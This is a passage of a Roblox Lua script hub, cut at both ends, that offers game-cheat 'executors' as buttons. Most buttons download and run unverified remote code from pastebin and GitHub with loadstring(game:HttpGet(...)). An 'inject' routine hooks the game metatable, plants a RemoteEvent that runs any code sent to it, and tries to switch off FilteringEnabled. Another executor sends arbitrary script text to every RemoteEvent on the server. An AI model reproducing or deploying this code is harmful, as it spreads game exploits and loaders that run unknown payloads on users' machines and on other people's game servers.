clear.TextColor3 = Color3.fromRGB(0, 0, 0)
clear.TextSize = 13.000
strok2.LineJoinMode = Enum.LineJoinMode.Bevel
strok2.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
clear.MouseButton1Down:Connect(function()
	stringbox.Text = ""
end)
 
UIGradient_2.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(83, 109, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient_2.Rotation = 90
UIGradient_2.Parent = clear
 
inject.Name = "inject"
inject.Parent = windowphj
inject.BackgroundColor3 = Color3.fromRGB(110, 212, 255)
inject.BorderColor3 = Color3.fromRGB(0, 0, 0)
inject.BorderSizePixel = 0
inject.Position = UDim2.new(0.673278153, 0, 0.832335353, 0)
inject.Size = UDim2.new(0, 104, 0, 19)
inject.Font = Enum.Font.SourceSans
inject.Text = "inject"
inject.TextColor3 = Color3.fromRGB(0, 0, 0)
inject.TextSize = 13.000
strok3.LineJoinMode = Enum.LineJoinMode.Bevel
strok3.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
inject.MouseButton1Down:Connect(function()
	task.spawn(function()
		Begin = function()
 
			local gMetatable = getrawmetatable(game)
 
			local Index = function(self, k)
				local Function = string.lower(k)
				if Function == "Execute" then
					return function(self, source)
						return { loadstring(source)() }
					end
				end
			end
 
			local o_Index = gMetatable.__index
			gMetatable.__index = function(self, k)
				local v = index(self, k)
				if v then
					return v
				end
				return o_Index(self, k)
			end
 
			local o_Namecall = gMetatable.__namecall
			gMetatable.__namecall = function(self, ...)
				local args = {...}
				local method = table.remove(args)
 
				if type(method) == "string" then
					local ret = Index(self, method)
					if ret then
						return ret(self, unpack(args))
					end
				end
				return o_Namecall(self, ...)
			end
 
 
			local RemoteEvent = Instance.new("RemoteEvent")
			RemoteEvent.Parent=game.ReplicatedStorage
 
			RemoteEvent.OnServerEvent:connect(function(Source)
				game:Execute(Source)
			end)
		end
		spawn(function() Begin() end)
	end)
	getfenv(function()
		print("NOTIN")
	end)
	spawn(function()
		getfenv(function()
			print("NOTIN")
		end)getfenv(1)
		local ran = rawget({["total"] = true}, 1)
		while wait() do
			workspace.FilteringEnabled = false
		end
	end)
	wait(1)
	injected = true
end)
UIGradient_3.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(83, 109, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient_3.Rotation = 90
UIGradient_3.Parent = inject
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab4:AddButton({
	Name = "Gotham Executor",
	Callback = function()
	  --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local key = Instance.new("Frame")
local TextButton = Instance.new("TextButton")
local TextButton1 = Instance.new("TextButton")
local text = Instance.new("TextLabel")
local TextButton2 = Instance.new("TextButton")
local TextLabel = Instance.new("TextLabel")
local TextBox = Instance.new("TextBox")
local Frame = Instance.new("Frame")
local TextLabel_2 = Instance.new("TextLabel")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false

key.Name = "key"
key.Parent = ScreenGui
key.Active = true
key.BackgroundColor3 = Color3.fromRGB(112, 112, 112)
key.Draggable = true
key.Position = UDim2.new(0.0366116166, 415, 0.168316841, 66)
key.Size = UDim2.new(0.3115578, 0, 0.508250833, 0)

TextButton.Parent = key
TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton.BackgroundTransparency = 1.000
TextButton.Position = UDim2.new(0.642857134, 0, 0.790584385, 0)
TextButton.Size = UDim2.new(0.297235012, 0, 0.172077924, 0)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "ss execute"
TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton.TextScaled = true
TextButton.TextSize = 14.000
TextButton.TextWrapped = true

TextButton1.Name = "TextButton1"
TextButton1.Parent = key
TextButton1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton1.BackgroundTransparency = 1.000
TextButton1.Position = UDim2.new(0.382488489, 0, 0.790584385, 0)
TextButton1.Size = UDim2.new(0.235023037, 0, 0.172077924, 0)
TextButton1.Font = Enum.Font.SourceSans
TextButton1.Text = "clear"
TextButton1.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton1.TextScaled = true
TextButton1.TextSize = 14.000
TextButton1.TextWrapped = true

text.Name = "text"
text.Parent = key
text.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
text.Size = UDim2.new(1, 0, 0.152597398, 0)
text.Font = Enum.Font.GothamBold
text.Text = "Gotham executor"
text.TextColor3 = Color3.fromRGB(107, 107, 107)
text.TextScaled = true
text.TextSize = 14.000
text.TextStrokeColor3 = Color3.fromRGB(0, 187, 255)
text.TextStrokeTransparency = 0.000
text.TextWrapped = true

TextButton2.Name = "TextButton2"
TextButton2.Parent = key
TextButton2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton2.BackgroundTransparency = 1.000
TextButton2.Position = UDim2.new(0.0529953837, 0, 0.790584385, 0)
TextButton2.Size = UDim2.new(0.297235012, 0, 0.172077924, 0)
TextButton2.Font = Enum.Font.SourceSans
TextButton2.Text = "execute"
TextButton2.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton2.TextScaled = true
TextButton2.TextSize = 14.000
TextButton2.TextWrapped = true

TextLabel.Parent = key
TextLabel.BackgroundColor3 = Color3.fromRGB(143, 143, 143)
TextLabel.BorderSizePixel = 2
TextLabel.Position = UDim2.new(0.0207373295, 0, 0.233834401, 0)
TextLabel.Size = UDim2.new(0.97926265, 0, 0.156105638, 0)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "Script"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

TextBox.Parent = TextLabel
TextBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextBox.Position = UDim2.new(0, 0, 0.986981273, 0)
TextBox.Size = UDim2.new(0.999999821, 0, 2.37153006, 0)
TextBox.ClearTextOnFocus = false
TextBox.Font = Enum.Font.SourceSans
TextBox.MultiLine = true
TextBox.PlaceholderText = "Console's script..."
TextBox.Text = ""
TextBox.TextColor3 = Color3.fromRGB(0, 255, 0)
TextBox.TextSize = 14.000
TextBox.TextWrapped = true
TextBox.TextXAlignment = Enum.TextXAlignment.Left
TextBox.TextYAlignment = Enum.TextYAlignment.Top

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame.Position = UDim2.new(0.454414934, 0, 0.470297039, 0)
Frame.Size = UDim2.new(0.0717875063, 0, 0.165016502, 0)

TextLabel_2.Parent = Frame
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 0.990
TextLabel_2.Size = UDim2.new(1, 0, 1, 0)
TextLabel_2.Font = Enum.Font.GothamBold
TextLabel_2.Text = "G"
TextLabel_2.TextColor3 = Color3.fromRGB(89, 198, 220)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 14.000
TextLabel_2.TextWrapped = true

-- Scripts:

local function TDQNWU_fake_script() -- Frame.LocalScript 
	local script = Instance.new('LocalScript', Frame)

	script.Parent.Visible = false
	script.Parent.Parent.key.Visible = false
	wait(1)
	script.Parent.Visible = true
	loading=math.random(5, 15)
	spawn(function()
		game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(15), {Rotation = 555}):Play()
	end)
	wait(loading)
	script.Parent.BackgroundTransparency = 0.5
	script.Parent.TextLabel.TextTransparency = 0.5
	wait(1)
	script.Parent.BackgroundTransparency = 1
	script.Parent.TextLabel.TextTransparency = 1;script.Parent.Visible = false
	wait(1.6)
	script.Parent.Parent.key.Visible = true;
end
coroutine.wrap(TDQNWU_fake_script)()
local function JQGTW_fake_script() -- ScreenGui.LocalScript 
	local script = Instance.new('LocalScript', ScreenGui)

	
	errorGetWarned=math.random(1, 100)if errorGetWarned==100 then game.Players.LocalPlayer:Kick("error 492: got whilelisted by number")end
	
	--sorry for obfuscating i just obfuscated this executor script of execute ss
	local frame=script.Parent.key
	frame.TextButton.MouseButton1Click:Connect(function()for i, v in pairs(game.ReplicatedStorage:GetDescendants())do if v:IsA("RemoteEvent") and (not string.match(v.Name, "Ban")) and not (v.Parent.Name == "DefaultChatSystemChatEvents") then v:FireServer(frame.TextLabel.TextBox.Text) print(v.Name.. " executed lol") end;end;end)
	
	frame.TextButton2.MouseButton1Click:Connect(function()
		assert(loadstring(frame.TextLabel.TextBox.Text))()
	end)
	
	frame.TextButton1.MouseButton1Click:Connect(function()
		frame.TextLabel.TextBox.Text = ""
	end)
	
	frame.Draggable=(true);frame.Active=true; -- drag script
end
coroutine.wrap(JQGTW_fake_script)()

      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab4:AddButton({
	Name = "Random Executor",
	Callback = function()
	  --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
local HttpService = game:GetService("HttpService")

-- Check if the script executor GUI has already been created
if not game.Players.LocalPlayer.PlayerGui:FindFirstChild("ScriptExecutorGui") then
    local scriptExecutorGui = Instance.new("ScreenGui")
    scriptExecutorGui.Name = "ScriptExecutorGui"
    scriptExecutorGui.Parent = game.Players.LocalPlayer.PlayerGui
    
    local mainFrame = Instance.new("Frame")
    mainFrame.Name = "MainFrame"
    mainFrame.BackgroundTransparency = 0.5
    mainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
    mainFrame.Size = UDim2.new(0, 300, 0, 200)
    mainFrame.Position = UDim2.new(0.5, -150, 0.5, -100)
    mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    mainFrame.BorderSizePixel = 0
    mainFrame.Active = true
    mainFrame.Draggable = true
    mainFrame.Parent = scriptExecutorGui
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 10)
    corner.Parent = mainFrame
    
    local scriptTextBox = Instance.new("TextBox")
    scriptTextBox.Name = "ScriptTextBox"
    scriptTextBox.BackgroundTransparency = 0.8
    scriptTextBox.BackgroundColor3 = Color3.new(1, 1, 1)
    scriptTextBox.Size = UDim2.new(0.8, 0, 0.5, 0)
    scriptTextBox.Position = UDim2.new(0.1, 0, 0.1, 0)
    scriptTextBox.Font = Enum.Font.SourceSans
    scriptTextBox.TextSize = 18
    scriptTextBox.TextWrapped = true
    scriptTextBox.Text = "Type your script here..."
    scriptTextBox.Parent = mainFrame
    
    local executeButton = Instance.new("TextButton")
    executeButton.Name = "ExecuteButton"
    executeButton.BackgroundColor3 = Color3.new(0, 0.5, 1)
    executeButton.TextColor3 = Color3.new(1, 1, 1)
    executeButton.Size = UDim2.new(0.4, 0, 0.2, 0)
    executeButton.Position = UDim2.new(0.3, 0, 0.7, 0)
    executeButton.Font = Enum.Font.SourceSans
    executeButton.TextSize = 18
    executeButton.Text = "Execute"
    executeButton.Parent = mainFrame
    
    local function executeScript()
        local script = scriptTextBox.Text
        if script ~= "" then
            local success, error = pcall(function()
                loadstring(script)()
            end)
            
            if not success then
                print("Error executing script:", error)
            end
        end
    end
    
    executeButton.MouseButton1Click:Connect(executeScript)
end
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab4:AddButton({
	Name = "Alysse executor",
	Callback = function()
	  --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet("https://pastebin.com/raw/hmwSe0Xz"))()
      		print("button pressed")
  	end    
})

Tab4:AddButton({
	Name = "Sypz X",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/max96git/max96git-s-stuff/main/sypz/loader.lua",true))()
      		print("button pressed")
  	end    
})

Tab4:AddButton({
	Name = "Hydrogen Executor",
	Callback = function()
	  --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet("https://raw.githubusercontent.com/NathTheDev/Alysse-x-Krypton/main/Cracked-UI/HydrogenV2.lua"))()
      		print("button pressed")
  	end    
})

Tab4:AddButton({
	Name = "AnyaGen Executor",
	Callback = function()
-- [[ The Script is Sadly Obfuscated ]] --
loadstring(game:HttpGet("https://raw.githubusercontent.com/anyahubs/executer/main/Hydroui.lua"))();
-- Credits to AnyaHub
      		print("button pressed")
  	end    
})

Tab4:AddButton({
	Name = "Rc7",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/297x885xz/297x885xz/main/Rc7"))();
      		print("button pressed")
  	end    
})

Tab4:AddButton({
	Name = "NotePad Executor",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/JustAScripts/Favorable/main/NotePad.lua"))()
      		print("button pressed")
  	end    
})

Tab4:AddButton({
	Name = "Expo X V1 (Android)",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/GearV4/Expo-X-V1-Android/main/Expo%20X%20V1.lua"))();
      		print("button pressed")
  	end    
})

Tab4:AddButton({
	Name = "Expo X (Beta)",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/GearV4/Expo-X-Mobile-Beta-/main/Expo%20X%20(Beta)%20mobile"))();
      		print("button pressed")
  	end    
})

Tab4:AddButton({
	Name = "Synapse X Executor",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/Chillz-s-scripts/main/Synapse-X-Remake.lua"))()
      		print("button pressed")
  	end    
})

Tab4:AddButton({
	Name = "Wrath Z",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/WmwNN8UG"))();
      		print("button pressed")
  	end    
})

Tab4:AddButton({
	Name = "Fluxus Coral",
	Callback = function()
	  --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Fluxus-Coral-Remake-7112"))()
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab4:AddButton({
	Name = "ECCS EXECUTOR",
	Callback = function()
	  --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet("https://pastebin.com/raw/HwBx99u1"))("Copyright ERROR_CODE ECCS Co")
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab4:AddButton({
	Name = "Areceus X V3",
	Callback = function()
--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
 loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/Arceus%20X%20V3"))() 
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab4:AddButton({
	Name = "Vega X",
	Callback = function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/NathTheDev/Project/main/Vega%20X.lua"))()
      		print("button pressed")
  	end    
})

Tab4:AddButton({
	Name = "Hydrogen (Old)",
	Callback = function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/FrxRius/HydrogenMainUI-HydrogenKeySystemUISource/main/Source.txt"))()
      		print("button pressed")
  	end    
})

Tab4:AddButton({
	Name = "Krypton executor",
	Callback = function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/anyahubs/executer/main/Krypton(UI).txt"))()
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab4:AddButton({
	Name = "CodeX",
	Callback = function()
--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
 loadstring(game:HttpGet("https://raw.githubusercontent.com/NathTheDev/Project/main/Codex"))()
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab4:AddButton({
	Name = "Trigon",
	Callback = function()
--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
 loadstring(game:HttpGet("https://raw.githubusercontent.com/NathTheDev/Project/main/Trigon"))()
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab4:AddButton({
	Name = "Delta X",
	Callback = function()
--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
 loadstring(game:HttpGet("https://raw.githubusercontent.com/NathTheDev/Project/main/Delta_X"))()
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab4:AddButton({
	Name = "Arceus X Neo",
	Callback = function()
--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
 loadstring(game:HttpGet("https://raw.githubusercontent.com/NathTheDev/Alysse-x-Krypton/main/ArceusNEO.lua"))()
      		print("button pressed")
  	end    
})

Tab4:AddButton({
	Name = "Krnl",
	Callback = function()
local KRNL = Instance.new("ScreenGui")
local KrnlGUI = Instance.new("Frame")
local FileButton = Instance.new("TextButton")
local UITextSizeConstraint = Instance.new("UITextSizeConstraint")
local CreditsButton = Instance.new("TextButton")
local UITextSizeConstraint_2 = Instance.new("UITextSizeConstraint")
local GamesButton = Instance.new("TextButton")
local UITextSizeConstraint_3 = Instance.new("UITextSizeConstraint")
local HotScriptsButton = Instance.new("TextButton")
local UITextSizeConstraint_4 = Instance.new("UITextSizeConstraint")
local OthersButton = Instance.new("TextButton")
local UITextSizeConstraint_5 = Instance.new("UITextSizeConstraint")
local SideGUI = Instance.new("Frame")
local ImageLabel = Instance.new("ImageLabel")
local TextLabel = Instance.new("TextLabel")
local Xbutton = Instance.new("TextButton")
local UITextSizeConstraint_6 = Instance.new("UITextSizeConstraint")
local button = Instance.new("TextButton")
local UITextSizeConstraint_7 = Instance.new("UITextSizeConstraint")
local MainGUI = Instance.new("Frame")
local ExecuteBar = Instance.new("Frame")
local Frame = Instance.new("Frame")
local Script1 = Instance.new("Frame")
local TextButton = Instance.new("TextButton")
local UITextSizeConstraint_8 = Instance.new("UITextSizeConstraint")
local UITextSizeConstraint_9 = Instance.new("UITextSizeConstraint")
local TextButton_2 = Instance.new("TextButton")
local UITextSizeConstraint_10 = Instance.new("UITextSizeConstraint")
local UITextSizeConstraint_11 = Instance.new("UITextSizeConstraint")
local Script2 = Instance.new("Frame")
local TextButton_3 = Instance.new("TextButton")
local UITextSizeConstraint_12 = Instance.new("UITextSizeConstraint")
local UITextSizeConstraint_13 = Instance.new("UITextSizeConstraint")
local TextButton_4 = Instance.new("TextButton")
local UITextSizeConstraint_14 = Instance.new("UITextSizeConstraint")
local UITextSizeConstraint_15 = Instance.new("UITextSizeConstraint")
local addbutton = Instance.new("TextButton")
local ScrollingFrame1 = Instance.new("ScrollingFrame")
local ImageLabel_2 = Instance.new("ImageLabel")
local security = Instance.new("TextLabel")
local EditorFrame = Instance.new("ScrollingFrame")
local Source = Instance.new("TextBox")
local Comments_ = Instance.new("TextLabel")
local Globals_ = Instance.new("TextLabel")
local Keywords_ = Instance.new("TextLabel")
local RemoteHighlight_ = Instance.new("TextLabel")
local Strings_ = Instance.new("TextLabel")
local Tokens_ = Instance.new("TextLabel")
local Numbers_ = Instance.new("TextLabel")
local Lines = Instance.new("TextLabel")
local ScrollingFrame2 = Instance.new("ScrollingFrame")
local ImageLabel_3 = Instance.new("ImageLabel")
local security_2 = Instance.new("TextLabel")
local EditorFrame_2 = Instance.new("ScrollingFrame")
local Source_2 = Instance.new("TextBox")
local Comments__2 = Instance.new("TextLabel")
local Globals__2 = Instance.new("TextLabel")
local Keywords__2 = Instance.new("TextLabel")
local RemoteHighlight__2 = Instance.new("TextLabel")
local Strings__2 = Instance.new("TextLabel")
local Tokens__2 = Instance.new("TextLabel")
local Numbers__2 = Instance.new("TextLabel")
local Lines_2 = Instance.new("TextLabel")
local Execute = Instance.new("TextButton")
local UITextSizeConstraint_16 = Instance.new("UITextSizeConstraint")
local Clear = Instance.new("TextButton")
local UITextSizeConstraint_17 = Instance.new("UITextSizeConstraint")
local OpenFileButton = Instance.new("TextButton")
local UITextSizeConstraint_18 = Instance.new("UITextSizeConstraint")
local SaveFileButton = Instance.new("TextButton")
local UITextSizeConstraint_19 = Instance.new("UITextSizeConstraint")
local InjectButton = Instance.new("TextButton")
local UITextSizeConstraint_20 = Instance.new("UITextSizeConstraint")
local OptionButton = Instance.new("TextButton")
local UITextSizeConstraint_21 = Instance.new("UITextSizeConstraint")
local ScriptHub = Instance.new("ScrollingFrame")
local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
local InjectedMessgae = Instance.new("Frame")
local Frame_2 = Instance.new("Frame")
local Xbutton_2 = Instance.new("TextButton")
local UITextSizeConstraint_22 = Instance.new("UITextSizeConstraint")
local TextLabel_2 = Instance.new("TextLabel")
local Frame_3 = Instance.new("Frame")
local Okbutton = Instance.new("TextButton")
local UITextSizeConstraint_23 = Instance.new("UITextSizeConstraint")
local TextLabel_3 = Instance.new("TextLabel")
local UITextSizeConstraint_24 = Instance.new("UITextSizeConstraint")
local HScriptsHub = Instance.new("Frame")
local DexExplorer = Instance.new("TextButton")
local UITextSizeConstraint_25 = Instance.new("UITextSizeConstraint")
local OpenGui = Instance.new("TextButton")
local UITextSizeConstraint_26 = Instance.new("UITextSizeConstraint")
local RemoteSpy = Instance.new("TextButton")
local UITextSizeConstraint_27 = Instance.new("UITextSizeConstraint")
local DarkDex = Instance.new("TextButton")
local UITextSizeConstraint_28 = Instance.new("UITextSizeConstraint")
local UnamedEsp = Instance.new("TextButton")
local UITextSizeConstraint_29 = Instance.new("UITextSizeConstraint")
local IYFE = Instance.new("TextButton")
local UITextSizeConstraint_30 = Instance.new("UITextSizeConstraint")
local OwlHub = Instance.new("TextButton")
local UITextSizeConstraint_31 = Instance.new("UITextSizeConstraint")
local HoHoHub = Instance.new("TextButton")
local UITextSizeConstraint_32 = Instance.new("UITextSizeConstraint")
local BlueLight = Instance.new("Frame")
local CreditsW = Instance.new("Frame")
local Frame_4 = Instance.new("Frame")
local Xbutton_3 = Instance.new("TextButton")
local UITextSizeConstraint_33 = Instance.new("UITextSizeConstraint")
local TextLabel_4 = Instance.new("TextLabel")
local UITextSizeConstraint_34 = Instance.new("UITextSizeConstraint")
local TextLabel_5 = Instance.new("TextLabel")
local UITextSizeConstraint_35 = Instance.new("UITextSizeConstraint")
local ImageLabel_4 = Instance.new("ImageLabel")
local OtherTab = Instance.new("Frame")
local WHy = Instance.new("TextButton")
local UITextSizeConstraint_36 = Instance.new("UITextSizeConstraint")
local Nope = Instance.new("TextButton")
local UITextSizeConstraint_37 = Instance.new("UITextSizeConstraint")
local FileTab = Instance.new("Frame")
local KillTask = Instance.new("TextButton")
local UITextSizeConstraint_38 = Instance.new("UITextSizeConstraint")
local Inject = Instance.new("TextButton")
local UITextSizeConstraint_39 = Instance.new("UITextSizeConstraint")
local GamesOpenGUI = Instance.new("Frame")
local Frame_5 = Instance.new("Frame")
local Xbutton_4 = Instance.new("TextButton")
local UITextSizeConstraint_40 = Instance.new("UITextSizeConstraint")
local Frame_6 = Instance.new("Frame")
local Okbutton_2 = Instance.new("TextButton")
local UITextSizeConstraint_41 = Instance.new("UITextSizeConstraint")
local TextLabel_6 = Instance.new("TextLabel")
local UITextSizeConstraint_42 = Instance.new("UITextSizeConstraint")
local UIAspectRatioConstraint_2 = Instance.new("UIAspectRatioConstraint")
local FloatingGUI = Instance.new("ImageButton")

--Properties:

KRNL.Name = "KRNL"
KRNL.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
KRNL.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
KRNL.ResetOnSpawn = false

KrnlGUI.Name = "KrnlGUI"
KrnlGUI.Parent = KRNL
KrnlGUI.Active = true
KrnlGUI.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
KrnlGUI.BorderColor3 = Color3.fromRGB(34, 34, 34)
KrnlGUI.Position = UDim2.new(0, 137, 0, 141)
KrnlGUI.Size = UDim2.new(0, 685, 0, 344)
KrnlGUI.Visible = false

FileButton.Name = "File Button"
FileButton.Parent = KrnlGUI
FileButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
FileButton.BackgroundTransparency = 1.000
FileButton.Position = UDim2.new(0.00264457078, 0, 0.0971021578, 0)
FileButton.Size = UDim2.new(0.0666066185, 0, 0.0681233257, 0)
FileButton.Font = Enum.Font.SourceSans
FileButton.Text = "File"
FileButton.TextColor3 = Color3.fromRGB(255, 255, 255)
FileButton.TextScaled = true
FileButton.TextSize = 16.000
FileButton.TextWrapped = true

UITextSizeConstraint.Parent = FileButton
UITextSizeConstraint.MaxTextSize = 16

CreditsButton.Name = "Credits Button"
CreditsButton.Parent = KrnlGUI
CreditsButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CreditsButton.BackgroundTransparency = 1.000
CreditsButton.Position = UDim2.new(0.0700000003, 0, 0.0970000029, 0)
CreditsButton.Size = UDim2.new(0.0666066185, 0, 0.0681233257, 0)
CreditsButton.Font = Enum.Font.SourceSans
CreditsButton.Text = "Credits"
CreditsButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CreditsButton.TextScaled = true
CreditsButton.TextSize = 16.000
CreditsButton.TextWrapped = true

UITextSizeConstraint_2.Parent = CreditsButton
UITextSizeConstraint_2.MaxTextSize = 16

GamesButton.Name = "Games Button"
GamesButton.Parent = KrnlGUI
GamesButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
GamesButton.BackgroundTransparency = 1.000
GamesButton.Position = UDim2.new(0.150000006, 0, 0.0970000029, 0)
GamesButton.Size = UDim2.new(0.0666066185, 0, 0.0681233257, 0)
GamesButton.Font = Enum.Font.SourceSans
GamesButton.Text = "Games"
GamesButton.TextColor3 = Color3.fromRGB(255, 255, 255)
GamesButton.TextScaled = true
GamesButton.TextSize = 15.000
GamesButton.TextWrapped = true

UITextSizeConstraint_3.Parent = GamesButton
UITextSizeConstraint_3.MaxTextSize = 15

HotScriptsButton.Name = "Hot Scripts Button"
HotScriptsButton.Parent = KrnlGUI
HotScriptsButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
HotScriptsButton.BackgroundTransparency = 1.000
HotScriptsButton.Position = UDim2.new(0.232577384, 0, 0.0970000103, 0)
HotScriptsButton.Size = UDim2.new(0.0943726227, 0, 0.0681233257, 0)
HotScriptsButton.Font = Enum.Font.SourceSans
HotScriptsButton.Text = "Hot-Scripts"
HotScriptsButton.TextColor3 = Color3.fromRGB(255, 255, 255)
HotScriptsButton.TextScaled = true
HotScriptsButton.TextSize = 15.000
HotScriptsButton.TextWrapped = true

UITextSizeConstraint_4.Parent = HotScriptsButton
UITextSizeConstraint_4.MaxTextSize = 15

OthersButton.Name = "Others Button"
OthersButton.Parent = KrnlGUI
OthersButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
OthersButton.BackgroundTransparency = 1.000
OthersButton.Position = UDim2.new(0.340016991, 0, 0.0970000103, 0)
OthersButton.Size = UDim2.new(0.0682386607, 0, 0.0681233257, 0)
OthersButton.Font = Enum.Font.SourceSans
OthersButton.Text = "Others"
OthersButton.TextColor3 = Color3.fromRGB(255, 255, 255)
OthersButton.TextScaled = true
OthersButton.TextSize = 15.000
OthersButton.TextWrapped = true

UITextSizeConstraint_5.Parent = OthersButton
UITextSizeConstraint_5.MaxTextSize = 15

SideGUI.Name = "Side GUI"
SideGUI.Parent = KrnlGUI
SideGUI.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
SideGUI.BorderColor3 = Color3.fromRGB(31, 31, 31)
SideGUI.Size = UDim2.new(0.99889791, 0, 0.095630005, 0)

ImageLabel.Parent = SideGUI
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BackgroundTransparency = 1.000
ImageLabel.Position = UDim2.new(0.00300000003, 0, 0.123999998, 0)
ImageLabel.Size = UDim2.new(0.0361689702, 0, 0.726585209, 0)
ImageLabel.Image = "rbxassetid://11671355800"

TextLabel.Parent = SideGUI
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Position = UDim2.new(0.465686679, 0, 0.136606336, 0)
TextLabel.Size = UDim2.new(0.0694269463, 0, 0.726004899, 0)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "KRNL"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 20.000
TextLabel.TextWrapped = true

Xbutton.Name = "X button"
Xbutton.Parent = SideGUI
Xbutton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Xbutton.BackgroundTransparency = 1.000
Xbutton.Position = UDim2.new(0.957000017, 0, 0.159999996, 0)
Xbutton.Size = UDim2.new(0.0409558825, 0, 0.690584838, 0)
Xbutton.Font = Enum.Font.SourceSans
Xbutton.Text = "X"
Xbutton.TextColor3 = Color3.fromRGB(255, 255, 255)
Xbutton.TextSize = 40.000
Xbutton.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
Xbutton.TextWrapped = true

UITextSizeConstraint_6.Parent = Xbutton
UITextSizeConstraint_6.MaxTextSize = 35

button.Name = "- button"
button.Parent = SideGUI
button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
button.BackgroundTransparency = 1.000
